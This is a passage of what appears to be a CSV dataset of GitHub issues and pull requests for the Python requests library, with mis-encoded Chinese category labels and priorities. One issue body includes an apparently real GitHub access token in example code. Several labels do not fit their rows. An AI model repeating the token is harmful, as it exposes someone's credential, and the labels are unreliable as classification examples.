<li>Pin actions/checkout's own workflows to a known, good, stable version. by <a href=""https://github.com/jww3""><code>@â€‹jww3</code></a> in <a href=""https://redirect.github.com/actions/checkout/pull/1776"">actions/checkout#1776</a></li>
</ul>
<h2>New Contributors</h2>
<ul>
<li><a href=""https://github.com/orhantoy""><code>@â€‹orhantoy</code></a> made their first contribution in <a href=""https://redirect.github.com/actions/checkout/pull/1774"">actions/checkout#1774</a></li>
</ul>
<p><strong>Full Changelog</strong>: <a href=""https://github.com/actions/checkout/compare/v4.1.6...v4.1.7"">https://github.com/actions/checkout/compare/v4.1.6...v4.1.7</a></p>
<h2>v4.1.6</h2>
<h2>What's Changed</h2>
<ul>
<li>Check platform to set archive extension appropriately by <a href=""https://github.com/cory-miller""><code>@â€‹cory-miller</code></a> in <a href=""https://redirect.github.com/actions/checkout/pull/1732"">actions/checkout#1732</a></li>
<li>Update for 4.1.6 release by <a href=""https://github.com/cory-miller""><code>@â€‹cory-miller</code></a> in <a href=""https://redirect.github.com/actions/checkout/pull/1733"">actions/checkout#1733</a></li>
</ul>
<p><strong>Full Changelog</strong>: <a href=""https://github.com/actions/checkout/compare/v4.1.5...v4.1.6"">https://github.com/actions/checkout/compare/v4.1.5...v4.1.6</a></p>
<h2>v4.1.5</h2>
<h2>What's Changed</h2>
<ul>
<li>Update NPM dependencies by <a href=""https://github.com/cory-miller""><code>@â€‹cory-miller</code></a> in <a href=""https://redirect.github.com/actions/checkout/pull/1703"">actions/checkout#1703</a></li>
<li>Bump github/codeql-action from 2 to 3 by <a href=""https://github.com/dependabot""><code>@â€‹dependabot</code></a> in <a href=""https://redirect.github.com/actions/checkout/pull/1694"">actions/checkout#1694</a></li>
<li>Bump actions/setup-node from 1 to 4 by <a href=""https://github.com/dependabot""><code>@â€‹dependabot</code></a> in <a href=""https://redirect.github.com/actions/checkout/pull/1696"">actions/checkout#1696</a></li>
<li>Bump actions/upload-artifact from 2 to 4 by <a href=""https://github.com/dependabot""><code>@â€‹dependabot</code></a> in <a href=""https://redirect.github.com/actions/checkout/pull/1695"">actions/checkout#1695</a></li>
<li>README: Suggest <code>user.email</code> to be <code>41898282+github-actions[bot]@users.noreply.github.com</code> by <a href=""https://github.com/cory-miller""><code>@â€‹cory-miller</code></a> in <a href=""https://redirect.github.com/actions/checkout/pull/1707"">actions/checkout#1707</a></li>
</ul>
<p><strong>Full Changelog</strong>: <a href=""https://github.com/actions/checkout/compare/v4.1.4...v4.1.5"">https://github.com/actions/checkout/compare/v4.1.4...v4.1.5</a></p>
<h2>v4.1.4</h2>
<h2>What's Changed</h2>
<ul>
<li>Disable <code>extensions.worktreeConfig</code> when disabling <code>sparse-checkout</code> by <a href=""https://github.com/jww3""><code>@â€‹jww3</code></a> in <a href=""https://redirect.github.com/actions/checkout/pull/1692"">actions/checkout#1692</a></li>
<li>Add dependabot config by <a href=""https://github.com/cory-miller""><code>@â€‹cory-miller</code></a> in <a href=""https://redirect.github.com/actions/checkout/pull/1688"">actions/checkout#1688</a></li>
<li>Bump word-wrap from 1.2.3 to 1.2.5 by <a href=""https://github.com/dependabot""><code>@â€‹dependabot</code></a> in <a href=""https://redirect.github.com/actions/checkout/pull/1643"">actions/checkout#1643</a></li>
<li>Bump the minor-actions-dependencies group with 2 updates by <a href=""https://github.com/dependabot""><code>@â€‹dependabot</code></a> in <a href=""https://redirect.github.com/actions/checkout/pull/1693"">actions/checkout#1693</a></li>
</ul>
<p><strong>Full Changelog</strong>: <a href=""https://github.com/actions/checkout/compare/v4.1.3...v4.1.4"">https://github.com/actions/checkout/compare/v4.1.3...v4.1.4</a></p>
<!-- raw HTML omitted -->
</blockquote>
<p>... (truncated)</p>
</details>
<details>
<summary>Changelog</summary>
<p><em>Sourced from <a href=""https://github.com/actions/checkout/blob/main/CHANGELOG.md"">actions/checkout's changelog</a>.</em></p>
<blockquote>
<h1>Changelog</h1>
<h2>v4.2.0</h2>
<ul>
<li>Add Ref and Commit outputs by <a href=""https://github.com/lucacome""><code>@â€‹lucacome</code></a> in <a href=""https://redirect.github.com/actions/checkout/pull/1180"">actions/checkout#1180</a></li>
<li>Dependency updates by <a href=""https://github.com/dependabot""><code>@â€‹dependabot</code></a>- <a href=""https://redirect.github.com/actions/checkout/pull/1777"">actions/checkout#1777</a>, <a href=""https://redirect.github.com/actions/checkout/pull/1872"">actions/checkout#1872</a></li>
</ul>
<h2>v4.1.7</h2>
<ul>
<li>Bump the minor-npm-dependencies group across 1 directory with 4 updates by <a href=""https://github.com/dependabot""><code>@â€‹dependabot</code></a> in <a href=""https://redirect.github.com/actions/checkout/pull/1739"">actions/checkout#1739</a></li>
<li>Bump actions/checkout from 3 to 4 by <a href=""https://github.com/dependabot""><code>@â€‹dependabot</code></a> in <a href=""https://redirect.github.com/actions/checkout/pull/1697"">actions/checkout#1697</a></li>
<li>Check out other refs/* by commit by <a href=""https://github.com/orhantoy""><code>@â€‹orhantoy</code></a> in <a href=""https://redirect.github.com/actions/checkout/pull/1774"">actions/checkout#1774</a></li>
<li>Pin actions/checkout's own workflows to a known, good, stable version. by <a href=""https://github.com/jww3""><code>@â€‹jww3</code></a> in <a href=""https://redirect.github.com/actions/checkout/pull/1776"">actions/checkout#1776</a></li>
</ul>
<h2>v4.1.6</h2>
<ul>
<li>Check platform to set archive extension appropriately by <a href=""https://github.com/cory-miller""><code>@â€‹cory-miller</code></a> in <a href=""https://redirect.github.com/actions/checkout/pull/1732"">actions/checkout#1732</a></li>
</ul>
<h2>v4.1.5</h2>
<ul>
<li>Update NPM dependencies by <a href=""https://github.com/cory-miller""><code>@â€‹cory-miller</code></a> in <a href=""https://redirect.github.com/actions/checkout/pull/1703"">actions/checkout#1703</a></li>
<li>Bump github/codeql-action from 2 to 3 by <a href=""https://github.com/dependabot""><code>@â€‹dependabot</code></a> in <a href=""https://redirect.github.com/actions/checkout/pull/1694"">actions/checkout#1694</a></li>
<li>Bump actions/setup-node from 1 to 4 by <a href=""https://github.com/dependabot""><code>@â€‹dependabot</code></a> in <a href=""https://redirect.github.com/actions/checkout/pull/1696"">actions/checkout#1696</a></li>
<li>Bump actions/upload-artifact from 2 to 4 by <a href=""https://github.com/dependabot""><code>@â€‹dependabot</code></a> in <a href=""https://redirect.github.com/actions/checkout/pull/1695"">actions/checkout#1695</a></li>
<li>README: Suggest <code>user.email</code> to be <code>41898282+github-actions[bot]@users.noreply.github.com</code> by <a href=""https://github.com/cory-miller""><code>@â€‹cory-miller</code></a> in <a href=""https://redirect.github.com/actions/checkout/pull/1707"">actions/checkout#1707</a></li>
</ul>
<h2>v4.1.4</h2>
<ul>
<li>Disable <code>extensions.worktreeConfig</code> when disabling <code>sparse-checkout</code> by <a href=""https://github.com/jww3""><code>@â€‹jww3</code></a> in <a href=""https://redirect.github.com/actions/checkout/pull/1692"">actions/checkout#1692</a></li>
<li>Add dependabot config by <a href=""https://github.com/cory-miller""><code>@â€‹cory-miller</code></a> in <a href=""https://redirect.github.com/actions/checkout/pull/1688"">actions/checkout#1688</a></li>
<li>Bump the minor-actions-dependencies group with 2 updates by <a href=""https://github.com/dependabot""><code>@â€‹dependabot</code></a> in <a href=""https://redirect.github.com/actions/checkout/pull/1693"">actions/checkout#1693</a></li>
<li>Bump word-wrap from 1.2.3 to 1.2.5 by <a href=""https://github.com/dependabot""><code>@â€‹dependabot</code></a> in <a href=""https://redirect.github.com/actions/checkout/pull/1643"">actions/checkout#1643</a></li>
</ul>
<h2>v4.1.3</h2>
<ul>
<li>Check git version before attempting to disable <code>sparse-checkout</code> by <a href=""https://github.com/jww3""><code>@â€‹jww3</code></a> in <a href=""https://redirect.github.com/actions/checkout/pull/1656"">actions/checkout#1656</a></li>
<li>Add SSH user parameter by <a href=""https://github.com/cory-miller""><code>@â€‹cory-miller</code></a> in <a href=""https://redirect.github.com/actions/checkout/pull/1685"">actions/checkout#1685</a></li>
<li>Update <code>actions/checkout</code> version in <code>update-main-version.yml</code> by <a href=""https://github.com/jww3""><code>@â€‹jww3</code></a> in <a href=""https://redirect.github.com/actions/checkout/pull/1650"">actions/checkout#1650</a></li>
</ul>
<h2>v4.1.2</h2>
<ul>
<li>Fix: Disable sparse checkout whenever <code>sparse-checkout</code> option is not present <a href=""https://github.com/dscho""><code>@â€‹dscho</code></a> in <a href=""https://redirect.github.com/actions/checkout/pull/1598"">actions/checkout#1598</a></li>
</ul>
<h2>v4.1.1</h2>
<ul>
<li>Correct link to GitHub Docs by <a href=""https://github.com/peterbe""><code>@â€‹peterbe</code></a> in <a href=""https://redirect.github.com/actions/checkout/pull/1511"">actions/checkout#1511</a></li>
<li>Link to release page from what's new section by <a href=""https://github.com/cory-miller""><code>@â€‹cory-miller</code></a> in <a href=""https://redirect.github.com/actions/checkout/pull/1514"">actions/checkout#1514</a></li>
</ul>
<h2>v4.1.0</h2>
<ul>
<li><a href=""https://redirect.github.com/actions/checkout/pull/1396"">Add support for partial checkout filters</a></li>
</ul>
<h2>v4.0.0</h2>
<ul>
<li><a href=""https://redirect.github.com/actions/checkout/pull/1067"">Support fetching without the --progress option</a></li>
<li><a href=""https://redirect.github.com/actions/checkout/pull/1436"">Update to node20</a></li>
</ul>
<h2>v3.6.0</h2>
<ul>
<li><a href=""https://redirect.github.com/actions/checkout/pull/1377"">Fix: Mark test scripts with Bash'isms to be run via Bash</a></li>
</ul>
<!-- raw HTML omitted -->
</blockquote>
<p>... (truncated)</p>
</details>
<details>
<summary>Commits</summary>
<ul>
<li><a href=""https://github.com/actions/checkout/commit/d632683dd7b4114ad314bca15554477dd762a938""><code>d632683</code></a> Prepare 4.2.0 release (<a href=""https://redirect.github.com/actions/checkout/issues/1878"">#1878</a>)</li>
<li><a href=""https://github.com/actions/checkout/commit/6d193bf28034eafb982f37bd894289fe649468fc""><code>6d193bf</code></a> Bump braces from 3.0.2 to 3.0.3 (<a href=""https://redirect.github.com/actions/checkout/issues/1777"">#1777</a>)</li>
<li><a href=""https://github.com/actions/checkout/commit/db0cee9a514becbbd4a101a5fbbbf47865ee316c""><code>db0cee9</code></a> Bump the minor-npm-dependencies group across 1 directory with 4 updates (<a href=""https://redirect.github.com/actions/checkout/issues/1872"">#1872</a>)</li>
<li><a href=""https://github.com/actions/checkout/commit/b6849436894e144dbce29d7d7fda2ae3bf9d8365""><code>b684943</code></a> Add Ref and Commit outputs (<a href=""https://redirect.github.com/actions/checkout/issues/1180"">#1180</a>)</li>
<li><a href=""https://github.com/actions/checkout/commit/2d7d9f7ff5b310f983d059b68785b3c74d8b8edd""><code>2d7d9f7</code></a> Provide explanation for where user email came from (<a href=""https://redirect.github.com/actions/checkout/issues/1869"">#1869</a>)</li>
<li><a href=""https://github.com/actions/checkout/commit/9a9194f87191a7e9055e3e9b95b8cfb13023bb08""><code>9a9194f</code></a> Bump docker/build-push-action from 5.3.0 to 6.5.0 (<a href=""https://redirect.github.com/actions/checkout/issues/1832"">#1832</a>)</li>
<li><a href=""https://github.com/actions/checkout/commit/dd960bd3c3f080561a1810e32349ac211ecec7d4""><code>dd960bd</code></a> Bump docker/login-action in the minor-actions-dependencies group (<a href=""https://redirect.github.com/actions/checkout/issues/1831"">#1831</a>)</li>
<li><a href=""https://github.com/actions/checkout/commit/692973e3d937129bcbf40652eb9f2f61becf3332""><code>692973e</code></a> Prepare 4.1.7 release (<a href=""https://redirect.github.com/actions/checkout/issues/1775"">#1775</a>)</li>
<li><a href=""https://github.com/actions/checkout/commit/6ccd57f4c5d15bdc2fef309bd9fb6cc9db2ef1c6""><code>6ccd57f</code></a> Pin actions/checkout's own workflows to a known, good, stable version. (<a href=""https://redirect.github.com/actions/checkout/issues/1776"">#1776</a>)</li>
<li><a href=""https://github.com/actions/checkout/commit/b17fe1e4d59a9d1d95a7aead5e6fcd13e50939a5""><code>b17fe1e</code></a> Handle hidden refs (<a href=""https://redirect.github.com/actions/checkout/issues/1774"">#1774</a>)</li>
<li>Additional commits viewable in <a href=""https://github.com/actions/checkout/compare/8ade135a41bc03ea155e62e844d188df1ea18608...d632683dd7b4114ad314bca15554477dd762a938"">compare view</a></li>
</ul>
</details>
<br />


[![Dependabot compatibility score](https://dependabot-badges.githubapp.com/badges/compatibility_score?dependency-name=actions/checkout&package-manager=github_actions&previous-version=4.1.0&new-version=4.2.0)](https://docs.github.com/en/github/managing-security-vulnerabilities/about-dependabot-security-updates#about-compatibility-scores)

Dependabot will resolve any conflicts with this PR as long as you don't alter it yourself. You can also trigger a rebase manually by commenting `@dependabot rebase`.

[//]: # (dependabot-automerge-start)
[//]: # (dependabot-automerge-end)

---

<details>
<summary>Dependabot commands and options</summary>
<br />

You can trigger Dependabot actions by commenting on this PR:
- `@dependabot rebase` will rebase this PR
- `@dependabot recreate` will recreate this PR, overwriting any edits that have been made to it
- `@dependabot merge` will merge this PR after your CI passes on it
- `@dependabot squash and merge` will squash and merge this PR after your CI passes on it
- `@dependabot cancel merge` will cancel a previously requested merge and block automerging
- `@dependabot reopen` will reopen this PR if it is closed
- `@dependabot close` will close this PR and stop Dependabot recreating it. You can achieve the same result by closing it manually
- `@dependabot show <dependency name> ignore conditions` will show all of the ignore conditions of the specified dependency
- `@dependabot ignore this major version` will close this PR and stop Dependabot creating any more for this major version (unless you reopen the PR or upgrade to it yourself)
- `@dependabot ignore this minor version` will close this PR and stop Dependabot creating any more for this minor version (unless you reopen the PR or upgrade to it yourself)
- `@dependabot ignore this dependency` will close this PR and stop Dependabot creating any more for this dependency (unless you reopen the PR or upgrade to it yourself)


</details>","Bugåé¦ˆ, åŠŸèƒ½å»ºè®®, è´¦å·é—®é¢˜, æ–‡æ¡£é—®é¢˜",é«˜,https://github.com/psf/requests/pull/6803
2533848104,start testing on 3.13rc,,å…¶ä»–,ä¸­,https://github.com/psf/requests/pull/6802
2528749399,Teach users to use with-statements for Multipart-Encoded Files,"Hello, everyone!!

I am proposing a small improvement to `quickstart.rst` in order to teach users to use `with`-statements with `open()` calls when POSTing Multipart-Encoded files.",è´¦å·é—®é¢˜,ä¸­,https://github.com/psf/requests/pull/6801
2513371830,AttributeError: 'Request' object has no attribute 'authorize',"There seems to be a call to request.authorize. Shouldn't that be request.auth?

```python
import requests
requests.get(""https://google.com"").raise_for_status()
```

## Error
```
Traceback (most recent call last):
  File ""<frozen runpy>"", line 198, in _run_module_as_main
  File ""<frozen runpy>"", line 88, in _run_code
  File ""/home/user/my_lib/__main__.py"", line 23, in <module>
    requests.get(""https://google.com"").raise_for_status()
    ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File ""/home/user/my_lib/.venv/lib/python3.11/site-packages/requests/api.py"", line 73, in get
    return request(""get"", url, params=params, **kwargs)
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File ""/home/user/my_lib/.venv/lib/python3.11/site-packages/requests/api.py"", line 59, in request
    return session.request(method=method, url=url, **kwargs)
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File ""/home/user/my_lib/.venv/lib/python3.11/site-packages/requests/sessions.py"", line 575, in request
    prep = self.prepare_request(req)
           ^^^^^^^^^^^^^^^^^^^^^^^^^
  File ""/home/user/my_lib/.venv/lib/python3.11/site-packages/requests/sessions.py"", line 479, in prepare_request
    auth = request.authorize
```


## System Information

    $ python -m requests.help

```json
{
  ""chardet"": {
    ""version"": null
  },
  ""charset_normalizer"": {
    ""version"": ""3.3.2""
  },
  ""cryptography"": {
    ""version"": """"
  },
  ""idna"": {
    ""version"": ""3.8""
  },
  ""implementation"": {
    ""name"": ""CPython"",
    ""version"": ""3.11.9""
  },
  ""platform"": {
    ""release"": ""6.10.3-amd64"",
    ""system"": ""Linux""
  },
  ""pyOpenSSL"": {
    ""openssl_version"": """",
    ""version"": null
  },
  ""requests"": {
    ""version"": ""2.32.3""
  },
  ""system_ssl"": {
    ""version"": ""30300010""
  },
  ""urllib3"": {
    ""version"": ""2.2.2""
  },
  ""using_charset_normalizer"": true,
  ""using_pyopenssl"": false
}
```

<!-- This command is only available on Requests v2.16.4 and greater. Otherwise,
please provide some basic information about your system (Python version,
operating system, &c). -->
","Bugåé¦ˆ, åŠŸèƒ½å»ºè®®, è´¦å·é—®é¢˜",ä¸­,https://github.com/psf/requests/issues/6800
2507899117,Python requests: No module named 'werkzeug.wrappers.json',"I'm trying to use the requests library in Python, but when I do so, I get an error

```
        from werkzeug.wrappers.json import JSONMixin
    ModuleNotFoundError: No module named 'werkzeug.wrappers.json'
```

Below is an example (using a repo I forked specially for this, and a very fine grained access token that will expire soon, in case you're concerned about me sharing it). 

```
import requests
import json
  
# GitHub API URL to create an issue in the crobarcro/Spoon-Knife repository
url = 'https://api.github.com/repos/crobarcro/Spoon-Knife/issues'
  
# Example payload for creating a GitHub issue
payload = {
    ""title"": ""Test Issue from API"",
    ""body"": ""This is a test issue created via the GitHub API in the crobarcro/Spoon-Knife repository."",
    ""assignees"": [],  # You can assign this to specific users if needed
    ""labels"": [""bug""]  # Optional, you can add labels to the issue
}
 
# Headers with authentication (you need a GitHub token)
headers = {
    'Authorization': 'token ithub_pat_11AAYDNDA0SY1bhpNdK0uf_lozcWrMafgMe2RLe5foWudokRkMrCExRHovDM4cWog3JNIK4MZZeJWN5MGW',  # Replace with your GitHub token
    'Accept': 'application/vnd.github.v3+json',
    'Content-Type': 'application/json'
}
  
# Sending the POST request
response = requests.post(url, headers=headers, data=json.dumps(payload))
  
# Checking the response
if response.status_code == 201:
    print('Issue created successfully:', response.json())
else:
    print(f'Failed to create issue. Status code {response.status_code}:', response.text)
```

The full error message:

```
    Traceback (most recent call last):
      File ""/snap/pycharm-community/405/plugins/python-ce/helpers/pycharm/_jb_pytest_runner.py"", line 75, in <module>
        sys.exit(pytest.main(args, plugins_to_load + [Plugin]))
      File ""/home/<redacted>/.local/lib/python3.10/site-packages/_pytest/config/__init__.py"", line 159, in main
        config = _prepareconfig(args, plugins)
      File ""/home/<redacted>/.local/lib/python3.10/site-packages/_pytest/config/__init__.py"", line 346, in _prepareconfig
        config = pluginmanager.hook.pytest_cmdline_parse(
      File ""/home/<redacted>/.local/lib/python3.10/site-packages/pluggy/_hooks.py"", line 513, in __call__
        return self._hookexec(self.name, self._hookimpls.copy(), kwargs, firstresult)
      File ""/home/<redacted>/.local/lib/python3.10/site-packages/pluggy/_manager.py"", line 120, in _hookexec
        return self._inner_hookexec(hook_name, methods, kwargs, firstresult)
      File ""/home/<redacted>/.local/lib/python3.10/site-packages/pluggy/_callers.py"", line 139, in _multicall
        raise exception.with_traceback(exception.__traceback__)
      File ""/home/<redacted>/.local/lib/python3.10/site-packages/pluggy/_callers.py"", line 122, in _multicall
        teardown.throw(exception)  # type: ignore[union-attr]
      File ""/home/<redacted>/.local/lib/python3.10/site-packages/_pytest/helpconfig.py"", line 106, in pytest_cmdline_parse
        config = yield
      File ""/home/<redacted>/.local/lib/python3.10/site-packages/pluggy/_callers.py"", line 103, in _multicall
        res = hook_impl.function(*args)
      File ""/home/<redacted>/.local/lib/python3.10/site-packages/_pytest/config/__init__.py"", line 1152, in pytest_cmdline_parse
        self.parse(args)
      File ""/home/<redacted>/.local/lib/python3.10/site-packages/_pytest/config/__init__.py"", line 1501, in parse
        self._preparse(args, addopts=addopts)
      File ""/home/<redacted>/.local/lib/python3.10/site-packages/_pytest/config/__init__.py"", line 1388, in _preparse
        self.pluginmanager.load_setuptools_entrypoints(""pytest11"")
      File ""/home/<redacted>/.local/lib/python3.10/site-packages/pluggy/_manager.py"", line 421, in load_setuptools_entrypoints
        plugin = ep.load()
      File ""/usr/lib/python3.10/importlib/metadata/__init__.py"", line 171, in load
        module = import_module(match.group('module'))
      File ""/usr/lib/python3.10/importlib/__init__.py"", line 126, in import_module
        return _bootstrap._gcd_import(name[level:], package, level)
      File ""<frozen importlib._bootstrap>"", line 1050, in _gcd_import
      File ""<frozen importlib._bootstrap>"", line 1027, in _find_and_load
      File ""<frozen importlib._bootstrap>"", line 992, in _find_and_load_unlocked
      File ""<frozen importlib._bootstrap>"", line 241, in _call_with_frames_removed
      File ""<frozen importlib._bootstrap>"", line 1050, in _gcd_import
      File ""<frozen importlib._bootstrap>"", line 1027, in _find_and_load
      File ""<frozen importlib._bootstrap>"", line 992, in _find_and_load_unlocked
      File ""<frozen importlib._bootstrap>"", line 241, in _call_with_frames_removed
      File ""<frozen importlib._bootstrap>"", line 1050, in _gcd_import
      File ""<frozen importlib._bootstrap>"", line 1027, in _find_and_load
      File ""<frozen importlib._bootstrap>"", line 1006, in _find_and_load_unlocked
      File ""<frozen importlib._bootstrap>"", line 688, in _load_unlocked
      File ""/home/<redacted>/.local/lib/python3.10/site-packages/_pytest/assertion/rewrite.py"", line 178, in exec_module
        exec(co, module.__dict__)
      File ""/home/<redacted>/.local/lib/python3.10/site-packages/schemathesis/__init__.py"", line 2, in <module>
        from ._hypothesis import init_default_strategies, register_string_format
      File ""/home/<redacted>/.local/lib/python3.10/site-packages/_pytest/assertion/rewrite.py"", line 178, in exec_module
        exec(co, module.__dict__)
      File ""/home/<redacted>/.local/lib/python3.10/site-packages/schemathesis/_hypothesis.py"", line 13, in <module>
        from . import utils
      File ""/home/<redacted>/.local/lib/python3.10/site-packages/_pytest/assertion/rewrite.py"", line 178, in exec_module
        exec(co, module.__dict__)
      File ""/home/<redacted>/.local/lib/python3.10/site-packages/schemathesis/utils.py"", line 17, in <module>
        from werkzeug.wrappers.json import JSONMixin
    ModuleNotFoundError: No module named 'werkzeug.wrappers.json'
```

Some version information:

```
$ pip show werkzeug 
Name: Werkzeug
Version: 3.0.4
Summary: The comprehensive WSGI web application library.
Home-page: 
Author: 
Author-email: 
License: 
Location: /home/rcrozier/.local/lib/python3.10/site-packages
Requires: MarkupSafe
Required-by: Flask, schemathesis

$ pip show requests
Name: requests
Version: 2.32.3
Summary: Python HTTP for Humans.
Home-page: https://requests.readthedocs.io
Author: Kenneth Reitz
Author-email: me@kennethreitz.org
License: Apache-2.0
Location: /home/rcrozier/.local/lib/python3.10/site-packages
Requires: certifi, charset-normalizer, idna, urllib3
Required-by: CacheControl, greenbyteapi, schemathesis, zohocrmsdk2-0
```

I'm using Linux Mint 21.2

Am I making a mistake here? 
","Bugåé¦ˆ, åŠŸèƒ½å»ºè®®, è´¦å·é—®é¢˜, æ–‡æ¡£é—®é¢˜",ä¸­,https://github.com/psf/requests/issues/6799
